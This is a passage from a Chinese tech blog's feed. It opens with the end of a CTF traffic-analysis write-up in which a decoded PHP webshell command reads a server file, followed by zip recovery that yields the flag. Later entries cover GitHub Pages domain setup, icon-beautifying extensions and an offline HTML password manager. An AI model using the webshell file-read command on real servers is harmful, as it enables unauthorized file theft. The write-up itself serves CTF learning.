检查文件是否成功打开</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$P</span> === <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="comment">// 如果文件打开失败，输出错误信息并终止脚本</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ERROR:// File cannot be opened.&quot;</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取文件内容，filesize($F)获取文件大小，确保读取整个文件</span></span><br><span class="line"><span class="keyword">echo</span> @<span class="title function_ invoke__">fread</span>(<span class="variable">$P</span>, <span class="title function_ invoke__">filesize</span>(<span class="variable">$F</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭文件句柄，释放资源</span></span><br><span class="line">@<span class="title function_ invoke__">fclose</span>(<span class="variable">$P</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出结束分隔符，用于标识响应结束</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;|&lt;-&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 终止脚本执行</span></span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div></details><p>读取 zip 接着的下个 php 文件，即为 zip 文件，我们将后缀修改为<code>.zip</code>，用 WinHex 查看。</p><p><img src="/assets/CTF/Misc/traffic_analysis_1/5.png" alt="traffic_analysis_1"><br>注意到<a href="https://ctf-wiki.org/misc/archive/zip/">zip 文件头</a>多了<code>2D3E7C</code>，文件尾多了<code>7C3C2D</code>，我们将其删除，发现压缩包已经可以正常打开但是有密码。</p><blockquote><p>zip 的文件头由<code>504B0304</code>开头</p></blockquote><p><img src="/assets/CTF/Misc/traffic_analysis_1/6.png" alt="traffic_analysis_1"></p><p>我们输入前面拿到的关键信息<code>Th1s_1s_p4sswd_!!!</code>后，拿到<code>flag.txt</code>。<br>最终 flag 为<code>flag&#123;3OpWdJ-JP6FzK-koCMAK-VkfWBq-75Un2z&#125;</code>。</p><h2 id="优化点"><a href="#优化点" class="headerlink" title="优化点"></a>优化点</h2><ul><li>zip 可以直接用 Binwalk 提取<br><img src="/assets/CTF/Misc/traffic_analysis_1/7.png" alt="traffic_analysis_1"></li><li>可以只看 request 头和 response 包体</li><li>jpg 文件头由<code>FFD8FF</code>开头，由<code>FFD9</code>结尾，可以快速确定是个图片。</li><li>保存图片可以用 WinHex 打开那个报文后，删除多余信息，另存为<code>.jpg</code>文件</li></ul><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul><li><a href="https://blog.csdn.net/robacco/article/details/104908322">Misc 第八篇——功夫再高也怕菜刀（数据恢复、报文分析）</a></li></ul>]]></content>
    
    
    <summary type="html">使用 wireshark 打开pcapng文件，分析流量，发现图片和 zip 压缩包，图片为压缩包密码，解压后得到 flag。</summary>
    
    
    
    <category term="CTF" scheme="https://www.bandao.ltd/categories/CTF/"/>
    
    
    <category term="CTF" scheme="https://www.bandao.ltd/tags/CTF/"/>
    
    <category term="流量分析" scheme="https://www.bandao.ltd/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    
    <category term="Misc" scheme="https://www.bandao.ltd/tags/Misc/"/>
    
  </entry>
  
  <entry>
    <title>【技术教程】GitHub Pages 自定义域名配置指南</title>
    <link href="https://www.bandao.ltd/tutorial/github_domain.html"/>
    <id>https://www.bandao.ltd/tutorial/github_domain.html</id>
    <published>2024-11-06T08:30:00.000Z</published>
    <updated>2024-11-06T09:20:02.168Z</updated>
    
    <content type="html"><![CDATA[<div class="tag-plugin colorful note" color="green"><div class="body"><p>本文无广告，请放心浏览。文章使用腾讯云仅因为域名购买于腾讯云，购买于其他服务商可参考本文的第2，3步。</p></div></div><blockquote><p>笔者默认您已经<a href="https://buy.cloud.tencent.com/domain">拥有域名</a>并且完成<a href="https://cloud.tencent.com/document/product/243/97668">备案</a>，<a href="https://blog.csdn.net/clearloe/article/details/139879493">GitHub Pages 搭建</a>完成。</p></blockquote><h2 id="1-解析域名"><a href="#1-解析域名" class="headerlink" title="1. 解析域名"></a>1. 解析域名</h2><h3 id="添加-DNS-解析"><a href="#添加-DNS-解析" class="headerlink" title="添加 DNS 解析"></a>添加 DNS 解析</h3><p>打开<a href="https://console.cloud.tencent.com/domain/all-domain/all">域名管理</a>页面添加 DNS 记录。</p><div class="tag-plugin image"><div class="image-bg" style="background:white;"><img src="/assets/tutorial/github_domain/1.png" data-fancybox="true"/></div></div><h3 id="填写说明"><a href="#填写说明" class="headerlink" title="填写说明"></a>填写说明</h3><ul><li>主机记录填写您的二级域名</li><li>记录类型选择 CNAME</li><li>记录值填写您的博客的仓库名，如：xxx.github.io</li><li>TTL 填写 600（默认值）</li></ul><h2 id="2-仓库创建-CNAME-文件"><a href="#2-仓库创建-CNAME-文件" class="headerlink" title="2. 仓库创建 CNAME 文件"></a>2. 仓库创建 CNAME 文件</h2><p>添加 CNAME 文件方法有两种：</p><h3 id="【通用】创建-CNAME-文件"><a href="#【通用】创建-CNAME-文件" class="headerlink" title="【通用】创建 CNAME 文件"></a>【通用】创建 CNAME 文件</h3><p>Github Pages 仓库下新建文件，git 时可能会被覆盖。</p><div class="tag-plugin image"><div class="image-bg" style="background:white;"><img src="/assets/tutorial/github_domain/2.png" data-fancybox="true"/></div></div><h3 id="【Hexo】创建-CNAME-文件"><a href="#【Hexo】创建-CNAME-文件" class="headerlink" title="【Hexo】创建 CNAME 文件"></a>【Hexo】创建 CNAME 文件</h3><p>source 文件夹下创建 CNAME 文件，每次 Build 都会生成。</p><div class="tag-plugin image"><div class="image-bg" style="background:white;"><img src="/assets/tutorial/github_domain/3.png" data-fancybox="true"/></div></div><h3 id="CNAME-文件说明"><a href="#CNAME-文件说明" class="headerlink" title="CNAME 文件说明"></a>CNAME 文件说明</h3><ul><li>文件名为：CNAME（全大写，无后缀）</li><li>文本内容为：您的二级域名</li></ul><h2 id="3-设置自定义域名"><a href="#3-设置自定义域名" class="headerlink" title="3. 设置自定义域名"></a>3. 设置自定义域名</h2><p>Github Pages 仓库中选择 Settings 的 Pages 选项，填写 Custom domain，填写您的二级域名，点击 Save。<br>Github 会检查您的 DNS 配置是否正确，确认后会自动申请 TLS 证书（Let’s Encrtpy）。</p><div class="tag-plugin image"><div class="image-bg" style="background:white;"><img src="/assets/tutorial/github_domain/4.png" data-fancybox="true"/></div></div><h3 id="开启-HTTPS（推荐）"><a href="#开启-HTTPS（推荐）" class="headerlink" title="开启 HTTPS（推荐）"></a>开启 HTTPS（推荐）</h3><p>勾选 Enable HTTPS，若无法勾选可以等待 TLS 证书申请成功后再次尝试。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul><li><a href="https://cloud.tencent.com/developer/article/1421879">GitHub Pages 搭建的博客绑定域名</a></li><li><a href="https://blog.ifback.com/article/github-pages-bind-custom-domain-and-enable-https/">GitHub Page 绑定自定义域名 + 开启 HTTPS</a></li><li><a href="https://zhuanlan.zhihu.com/p/370635512">超详细 Hexo + Github Pages 博客搭建教程</a></li></ul>]]></content>
    
    
    <summary type="html">使用腾讯云的DNSPOD，绑定GitHub Pages 搭建的博客，可以使用自己的域名访问博客</summary>
    
    
    
    <category term="github" scheme="https://www.bandao.ltd/categories/github/"/>
    
    
    <category term="github" scheme="https://www.bandao.ltd/tags/github/"/>
    
    <category term="域名" scheme="https://www.bandao.ltd/tags/%E5%9F%9F%E5%90%8D/"/>
    
    <category term="腾讯云" scheme="https://www.bandao.ltd/tags/%E8%85%BE%E8%AE%AF%E4%BA%91/"/>
    
  </entry>
  
  <entry>
    <title>【良心推荐】仅需三分钟，美化你的github文件图标</title>
    <link href="https://www.bandao.ltd/recommend/github_file_icons.html"/>
    <id>https://www.bandao.ltd/recommend/github_file_icons.html</id>
    <published>2024-11-05T19:00:00.000Z</published>
    <updated>2024-11-06T03:38:34.510Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-GitHub-File-Icons"><a href="#1-GitHub-File-Icons" class="headerlink" title="1. GitHub File Icons"></a>1. GitHub File Icons</h2><p>这是一个 Chrome 插件，安装后即可美化 github 自带文件图标。</p><h3 id="Github-链接"><a href="#Github-链接" class="headerlink" title="Github 链接"></a>Github 链接</h3><div class="tag-plugin ghcard"><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/homerchen19/github-file-icons"><img src="https://github-readme-stats.xaoxuu.com/api/pin/?username=homerchen19&repo=github-file-icons&&show_owner=true"/></a></div><p><a href="https://chromewebstore.google.com/detail/file-icons-for-github-and/ficfmibkjjnpogdcfhfokmihanoldbfe">商店下载</a></p><h3 id="优化后效果"><a href="#优化后效果" class="headerlink" title="优化后效果"></a>优化后效果</h3><div class="tag-plugin image"><div class="image-bg" style="background:white;"><img src="https://user-images.githubusercontent.com/17788706/175958592-61fe3ca2-9d97-4419-a35e-4da4bac6230c.png" data-fancybox="true"/></div></div><h2 id="2-Github-网页图标主题"><a href="#2-Github-网页图标主题" class="headerlink" title="2. Github 网页图标主题"></a>2. Github 网页图标主题</h2><p>这是一个 <a href="https://www.tampermonkey.net/">Tampermonkey</a> 脚本（<a href="https://www.52pojie.cn/thread-1210985-1-1.html">使用教程</a>），使用了 vscode-material-icon-theme 主题的 icon，比 GitHub File Icons 的图标更加好看。</p><h3 id="Github-链接-1"><a href="#Github-链接-1" class="headerlink" title="Github 链接"></a>Github 链接</h3><h4 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h4><div class="tag-plugin ghcard"><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/fwqaaq/scripts"><img src="https://github-readme-stats.xaoxuu.com/api/pin/?username=fwqaaq&repo=scripts&&show_owner=true"/></a></div><ol><li><p><a href="https://greasyfork.org/zh-CN/scripts/471272-github-%E7%BD%91%E9%A1%B5%E5%9B%BE%E6%A0%87%E4%B8%BB%E9%A2%98">greasyfork 安装链接</a>，可以自动安装到 Tampermonkey。</p></li><li><p><a href="https://github.com/fwqaaq/scripts/blob/main/tampermonkey/github_web_icon_theme.js">github 脚本下载链接</a>，下载后自行导入 Tampermonkey（<a href="https://www.cnblogs.com/jdq-123/p/16272121.html">导入教程</a>）。</p></li></ol><h4 id="图标库"><a href="#图标库" class="headerlink" title="图标库"></a>图标库</h4><div class="tag-plugin ghcard"><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/material-extensions/vscode-material-icon-theme"><img src="https://github-readme-stats.xaoxuu.com/api/pin/?username=material-extensions&repo=vscode-material-icon-theme&&show_owner=true"/></a></div><h3 id="优化后效果-1"><a href="#优化后效果-1" class="headerlink" title="优化后效果"></a>优化后效果</h3><div class="tag-plugin image"><div class="image-bg" style="background:white;"><img src="/assets/recommend/github_file_icons/1.png" data-fancybox="true"/></div></div><h3 id="该脚本优化建议"><a href="#该脚本优化建议" class="headerlink" title="该脚本优化建议"></a>该脚本优化建议</h3><p>脚本第 165 行，图标使用 jsdelivr 加速。</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">- const url = `https://raw.githubusercontent.com/PKief/vscode-material-icon-theme/main/icons/$&#123;name&#125;.svg`</span></span><br><span class="line"><span class="addition">+ const url = `https://fastly.jsdelivr.net/gh/material-extensions/vscode-material-icon-theme/icons/$&#123;name&#125;.svg`</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">github自带文件图标表示都不够，使用插件优化后更加美观</summary>
    
    
    
    <category term="github" scheme="https://www.bandao.ltd/categories/github/"/>
    
    
    <category term="github" scheme="https://www.bandao.ltd/tags/github/"/>
    
    <category term="图标美化" scheme="https://www.bandao.ltd/tags/%E5%9B%BE%E6%A0%87%E7%BE%8E%E5%8C%96/"/>
    
    <category term="优化" scheme="https://www.bandao.ltd/tags/%E4%BC%98%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>【HTML】原生HTML密码管理：集成Toast通知的前端实现</title>
    <link href="https://www.bandao.ltd/coding/html/pwd_manager.html"/>
    <id>https://www.bandao.ltd/coding/html/pwd_manager.html</id>
    <published>2024-11-01T18:00:00.000Z</published>
    <updated>2024-11-11T18:45:02.809Z</updated>
    
    <content type="html"><![CDATA[<h2 id="实现的功能"><a href="#实现的功能" class="headerlink" title="实现的功能"></a>实现的功能</h2><ol><li>账密展示<div class="tag-plugin image"><div class="image-bg" style="background:white;padding:15px;"><img src="/assets/pwd_manager/1.png" data-fancybox="true" style="width:200px;"/></div></div></li><li>原生 Toast 展示复制情况<div class="tag-plugin image"><div class="image-bg" style="background:white;padding:15px;"><img src="/assets/pwd_manager/2.png" data-fancybox="true" style="width:200px;"/></div></div></li><li>点击复制</li></ol><h2 id="为什么强调原生"><a href="#为什么强调原生" class="headerlink" title="为什么强调原生"></a>为什么强调原生</h2><p>因为不需要引用第三方库，可以提高保密性并且在<strong>无网环境&#x2F;内网环境</strong>中使用<br><del>html 复健</del></p><h2 id="如何使用"><a href="#如何使用" class="headerlink" title="如何使用"></a>如何使用</h2><p>密码写在 html 中或者引入 pwd.js</p><blockquote><p>若密码写在 html 中，则注释此行<code>&lt;script src=&quot;./pwd.js&quot;&gt;&lt;/script&gt;</code>（默认）<br>若密码单独写在 pwd.js 中，则注释 html 中 pwdInfo 的部分 （便于维护）</p></blockquote><h3 id="index-html"><a href="#index-html" class="headerlink" title="index.html"></a>index.html</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>MiHoYo Password<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &lt;script src=&quot;./pwd.js&quot;&gt;&lt;/script&gt; --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">const</span> pwdInfo = [</span></span><br><span class="line"><span class="language-javascript">        &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">id</span>: <span class="number">0</span>,</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">name</span>: <span class="string">&quot;aaa&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">phone</span>: <span class="string">&quot;111&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">password</span>: <span class="string">&quot;111&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">id</span>: <span class="number">1</span>,</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">name</span>: <span class="string">&quot;bbb&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">phone</span>: <span class="string">&quot;222&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">password</span>: <span class="string">&quot;222&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">      ];</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">      * &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">font-family</span>: PingFang SC, Helvetic1, sans-serif;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">padding</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">margin</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="selector-class">.layout</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">height</span>: <span class="number">100vh</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">display</span>: flex;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">justify-content</span>: center;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">align-items</span>: center;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="selector-class">.bigBox</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">margin</span>: auto;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">display</span>: flex;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">flex-flow</span>: wrap;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">justify-content</span>: center;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="selector-class">.personBox</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">max-height</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">max-width</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="attribute">display</span>: flex;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">flex-flow</span>: column;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">justify-content</span>: center;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">align-items</span>: start;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="attribute">padding</span>: <span class="number">8px</span> <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">margin</span>: <span class="number">15px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">border-radius</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">background-color</span>: <span class="number">#4b6f98ef</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">transition</span>: background-color <span class="number">0.2s</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="selector-class">.personBox</span><span class="selector-pseudo">:hover</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">background-color</span>: <span class="number">#2b4460</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="selector-tag">h3</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">color</span>: <span class="number">#eee</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">padding-bottom</span>: <span class="number">3px</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="selector-tag">a</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">cursor</span>: pointer;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">padding</span>: <span class="number">1px</span> <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">font-size</span>: <span class="number">14px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">color</span>: <span class="number">#eee</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">transition</span>: font-size <span class="number">0.5s</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="selector-tag">a</span><span class="selector-pseudo">:hover</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">font-size</span>: <span class="number">15px</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="comment">/* 以下为toast */</span></span></span><br><span class="line"><span class="language-css">      <span class="comment">/* toast内容样式 */</span></span></span><br><span class="line"><span class="language-css">      <span class="selector-class">.toast</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">position</span>: fixed;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">top</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">right</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="attribute">margin</span>: <span class="number">15px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">padding</span>: <span class="number">15px</span>;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="attribute">background-color</span>: white;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">border-radius</span>: <span class="number">5px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#eee</span>;</span></span><br><span class="line"><span class="language-css">        <span class="comment">/* 加入边框 */</span></span></span><br><span class="line"><span class="language-css">        <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">2px</span> <span class="number">4px</span> <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.2</span>);</span></span><br><span class="line"><span class="language-css">        <span class="comment">/* 加入阴影 */</span></span></span><br><span class="line"><span class="language-css">        <span class="attribute">z-index</span>: <span class="number">1000</span>;</span></span><br><span class="line"><span class="language-css">        <span class="comment">/* 确保toast在顶层 */</span></span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="selector-class">.content</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">display</span>: flex;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">font-weight</span>: bold;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">font-size</span>: <span class="number">16px</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="comment">/* 显示toast的动画 */</span></span></span><br><span class="line"><span class="language-css">      <span class="selector-class">.show-toast</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">animation</span>: slideIn <span class="number">0.5s</span> ease forwards;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="comment">/* 隐藏toast的动画 */</span></span></span><br><span class="line"><span class="language-css">      <span class="selector-class">.hide-toast</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">animation</span>: slideOut <span class="number">0.5s</span> ease forwards;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="comment">/* 入场动画 */</span></span></span><br><span class="line"><span class="language-css">      <span class="keyword">@keyframes</span> slideIn &#123;</span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">from</span> &#123;</span></span><br><span class="line"><span class="language-css">          <span class="attribute">transform</span>: <span class="built_in">translateX</span>(<span class="number">200px</span>);</span></span><br><span class="line"><span class="language-css">          <span class="attribute">opacity</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">to</span> &#123;</span></span><br><span class="line"><span class="language-css">          <span class="attribute">transform</span>: <span class="built_in">translateX</span>(<span class="number">0</span>);</span></span><br><span class="line"><span class="language-css">          <span class="attribute">opacity</span>: <span class="number">1</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="comment">/* 出场动画 */</span></span></span><br><span class="line"><span class="language-css">      <span class="keyword">@keyframes</span> slideOut &#123;</span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">from</span> &#123;</span></span><br><span class="line"><span class="language-css">          <span class="attribute">transform</span>: <span class="built_in">translateX</span>(<span class="number">0</span>);</span></span><br><span class="line"><span class="language-css">          <span class="attribute">opacity</span>: <span class="number">1</span>;</span></span><br><span class="line"><span class="language-css">        